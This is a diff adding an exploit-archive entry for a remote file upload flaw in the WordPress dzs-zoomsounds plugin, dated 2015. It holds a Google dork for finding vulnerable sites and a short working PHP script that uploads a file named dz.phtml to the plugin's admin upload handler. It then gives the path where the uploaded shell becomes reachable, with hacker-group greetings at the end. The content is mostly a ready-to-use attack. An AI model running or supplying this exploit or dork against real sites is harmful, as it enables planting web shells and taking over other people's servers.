@@ -1,0 +1,24 @@
+###################################################################################################
+# Exploit Title: WordPress dzs-zoomsounds Plugins Remote File Upload Vulnerability
+# Vendor : http://digitalzoomstudio.net/docs/wpzoomsounds/
+# Author: bl4ck-dz
+# Date: 28/05/2015
+# Infected File: upload.php
+# Category: webapps
+# Google dork:inurl:/wp-content/plugins/dzs-zoomsounds/
+# Tested on : Linux | Windows
+###################################################################################################
+<?php 
+$evil="dz.phtml"; 
+$ch = curl_init("http://127.0.0.1/wp-content/plugins/dzs-zoomsounds/admin/upload.php"); 
+curl_setopt($ch, CURLOPT_POST, true); 
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+        array('file_field'=>"@$evil")); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$postResult = curl_exec($ch); curl_close($ch); 
+echo "$postResult"; 
+?>
+Shell Access :
+http://127.0.0.1/wp-content/plugins/dzs-zoomsounds/admin/upload/$Evil
+
+# GreeTz : Akram Stelle ~ Mr DZ ~ All DzTeaM Members & all all Dz H4x0rs !
